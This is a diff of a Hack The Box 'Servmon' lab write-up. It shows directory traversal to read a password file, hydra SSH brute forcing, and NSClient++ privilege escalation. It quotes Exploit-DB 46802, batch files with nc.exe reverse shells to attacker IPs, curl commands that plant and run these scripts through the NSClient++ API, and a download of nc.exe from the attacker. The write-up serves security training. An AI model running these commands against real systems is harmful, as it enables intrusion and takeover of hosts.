@@ -1,5 +1,14 @@
-```
-zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon 10.10.10.184                           
+# HTB - Servmon
+
+## Enumeration
+
+### Nmap scan
+
+First off, I started with an nmap scan of `10.10.10.184`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oN <name>` which saves the output to file with a name of `<name>.nmap`.
+
+```text
+zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon 10.10.10.184
+                           
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 22:24 EDT                                        
 Nmap scan report for 10.10.10.184                                                                      
 Host is up (0.047s latency).                                                                           
@@ -128,8 +137,14 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 60274.96 seconds
 ```
-try `Anonymous` ftp first 
-```
+
+Lots of open ports, start with low ports that are well known.
+
+### Anonymous FTP
+
+try `Anonymous` ftp first
+
+```text
 zweilos@kalimaa:~/htb/servmon$ ftp 10.10.10.184
 Connected to 10.10.10.184.
 220 Microsoft FTP Service
@@ -181,9 +196,10 @@ local: Notes to do.txt remote: Notes to do.txt
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 186 bytes received in 0.04 secs (4.1591 kB/s)
-ftp> 
+ftp>
 ```
-```
+
+```text
 zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 1) Change the password for NVMS - Complete
 2) Lock down the NSClient Access - Complete
@@ -191,7 +207,8 @@ zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 4) Remove public access to NVMS
 5) Place the secret files in SharePoint
 ```
-```
+
+```text
 zweilos@kalimaa:~/htb/servmon$ cat Confidential.txt 
 Nathan,
 
@@ -202,15 +219,21 @@ Regards
 Nadine
 ```
 
+next port 80 - redirects to [http://10.10.10.184/Pages/login.htm](http://10.10.10.184/Pages/login.htm) "NVMS-1000" \(pagetitle\) 
 
-next port 80 - redirects to http://10.10.10.184/Pages/login.htm 
-"NVMS-1000" (pagetitle)
-quick search of searchsploit finds exploit for this web portal: https://www.exploit-db.com/exploits/47774
-https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal
-since we know the location of the `Passwords.txt` file, use this to exfiltrate
+### Exploit Research
 
-did not work in url bar, but works in burp
-```
+quick search of searchsploit finds exploit for this web portal: [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774) [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal) since we know the location of the `Passwords.txt` file, use this to exfiltrate
+
+## Initial Foothold
+
+Can use GET requests and directory traversal to access files on the system.  Blog from Rapid7 shows good way to test for LFI and directory traversal for Windows.
+
+{% embed url="https://blog.rapid7.com/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/" %}
+
+
+
+```text
 GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
 Host: 10.10.10.184
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -222,7 +245,8 @@ Cookie: dataPort=6063; lang_type=0x0804%24zh-cn
 Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
-```
+
+```text
 HTTP/1.1 200 OK
 Content-type: text/plain
 Content-Length: 156
@@ -237,8 +261,12 @@ L1k3B1gBut7s@W0rk
 IfH3s4b0Utg0t0H1sH0me
 Gr4etN3w5w17hMySk1Pa5$
 ```
-now lets try to login to ssh as `Nathan` and `Nadine`. 
-```
+
+## Road to User
+
+now lets try to login to ssh as `Nathan` and `Nadine`.
+
+```text
 zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords 10.10.10.184 ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -250,9 +278,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 21:06:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:01
 ```
+
 thanks `Nadine` for using the same password you recommended!
 
-```
+```text
 zweilos@kalimaa:~/htb/servmon$ ssh Nadine@10.10.10.184
 Nadine@10.10.10.184's password: 
 Microsoft Windows [Version 10.0.18363.752]
@@ -262,7 +291,7 @@ nadine@SERVMON C:\Users\Nadine>whoami /all
 
 USER INFORMATION                                            
 ----------------                                            
-                                                            
+
 User Name      SID                                          
 ============== =============================================
 servmon\nadine S-1-5-21-3877449121-2587550681-992675040-1002
@@ -307,7 +336,10 @@ SeTimeZonePrivilege           Change the time zone                 Enabled
 
 nadine@SERVMON C:\Users\Nadine>
 ```
-```
+
+### user.txt
+
+```text
 nadine@SERVMON C:\Users\Nadine>cd Desktop
 
 nadine@SERVMON C:\Users\Nadine\Desktop>dir
@@ -327,10 +359,14 @@ nadine@SERVMON C:\Users\Nadine\Desktop>dir
 nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
 0a58d2f4816893591068a81a719f5f08
 ```
-C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-Nothing relevant...lots of attempts to do things from other users though!
 
-```
+## Path to Power \(Gaining Administrator Access\)
+
+### Enumeration as User
+
+C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost\_history.txt Nothing relevant...lots of attempts to do things from other users though!
+
+```text
 nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
 2018-01-18 Michael Medin
  * Fixed some Op5Client issues
@@ -342,7 +378,8 @@ nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
 
 ...snipped for brevity...
 ```
-```
+
+```text
 nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
 
 # If you want to fill this file with all available options run the following command:
@@ -381,33 +418,105 @@ they will be expanded by scripts placed under the wrapped scripts section. %SCRI
 ; Batch file - Command used for executing wrapped batch files
 bat = scripts\\%SCRIPT% %ARGS%
 ```
-nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
-Current password: ew2x6SsGTxjRwXOT
 
+### Exploit Research
 
+A Google search of nsclient++ and changelog leads to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where we can verify the dates in the changelog.ini against and versions of the program releases.  It seems as if we are on version 0.5.2.31 nightly build from the date of 2018-01-18. 
 
-```bat
+Again, a quick Searchsploit check found what looks to be an exploit that might work for this version.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
+
+```text
+Exploit Author: bzyo
+Twitter: @bzyo_
+Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
+Date: 05-05-19
+Vulnerable Software: NSClient++ 0.5.2.35
+Vendor Homepage: http://nsclient.org/
+Version: 0.5.2.35
+Software Link: http://nsclient.org/download/
+Tested on: Windows 10 x64
+
+Details:
+When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  
+
+The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  
+
+Prerequisites:
+To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.
+
+Exploit:
+1. Grab web administrator password
+- open c:\program files\nsclient++\nsclient.ini
+or
+- run the following that is instructed when you select forget password
+	C:\Program Files\NSClient++>nscp web -- password --display
+	Current password: SoSecret
+
+2. Login and enable following modules including enable at startup and save configuration
+- CheckExternalScripts
+- Scheduler
+
+3. Download nc.exe and evil.bat to c:\temp from attacking machine
+	@echo off
+	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
+
+4. Setup listener on attacking machine
+	nc -nlvvp 443
+
+5. Add script foobar to call evil.bat and save settings
+- Settings > External Scripts > Scripts
+- Add New
+	- foobar
+		command = c:\temp\evil.bat
+
+6. Add schedulede to call script every 1 minute and save settings
+- Settings > Scheduler > Schedules
+- Add new
+	- foobar
+		interval = 1m
+		command = foobar
+
+7. Restart the computer and wait for the reverse shell on attacking machine
+	nc -nlvvp 443
+	listening on [any] 443 ...
+	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
+	Microsoft Windows [Version 10.0.17134.753]
+	(c) 2018 Microsoft Corporation. All rights reserved.
+
+	C:\Program Files\NSClient++>whoami
+	whoami
+	nt authority\system
+	
+Risk:
+The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
+```
+
+`nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display Current password: ew2x6SsGTxjRwXOT`
+
+```text
 #@echo off
 c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
 ```
-When logging in, it was found that the login failed. After research, it was found that nsclient.ini would access the Web interface from the specified host. Only allow interface from local server (127.0.0.1):
+
+When logging in, it was found that the login failed. After research, it was found that nsclient.ini would allow access the Web interface only from the specified host. \(127.0.0.1 in this case\)
+
+### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
+
+[https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/](https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/)
 
 `ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184`
 
-https://127.0.0.1:8443/index.html#/
+[https://127.0.0.1:8443/index.html\#/](https://127.0.0.1:8443/index.html#/)
 
-https://docs.nsclient.org/api/
+[https://docs.nsclient.org/api/](https://docs.nsclient.org/api/)
 
-nadine@SERVMON C:\Users\Nadine>curl -k -u admin https://localhost:8443/api/v1
-Enter host password for user 'admin':
-curl: (7) Failed to connect to localhost port 8443: Connection refused
+nadine@SERVMON C:\Users\Nadine&gt;curl -k -u admin [https://localhost:8443/api/v1](https://localhost:8443/api/v1) Enter host password for user 'admin': curl: \(7\) Failed to connect to localhost port 8443: Connection refused
 
-nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe"
-Enter host password for user 'admin':
-Added evil as scripts\evil.bat
+nadine@SERVMON C:\Temp&gt;curl -s -k -u admin -X PUT [https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat](https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat) --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe" Enter host password for user 'admin': Added evil as scripts\evil.bat
 
-nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m
-```
+nadine@SERVMON C:\Users\Nadine&gt;curl -s -k -u admin [https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m](https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m)
+
+```text
 nadine@SERVMON C:\Temp>curl http://10.10.15.20:8090/nc.exe
 Warning: Binary output can mess up your terminal. Use "--output -" to tell
 Warning: curl to output it to your terminal anyway, or consider "--output
@@ -436,7 +545,8 @@ Enter host password for user 'admin':
 {"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","pe
 rf":{}}],"result":3}
 ```
-```
+
+```text
 zweilos@kalimaa:~$ nc -lvnp 12345
 listening on [any] 12345 ...
 connect to [10.10.15.20] from (UNKNOWN) [10.10.10.184] 49698
@@ -509,3 +619,4 @@ C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 410b71fc3946ddd7cb6c627f224d0d80
 ```
+
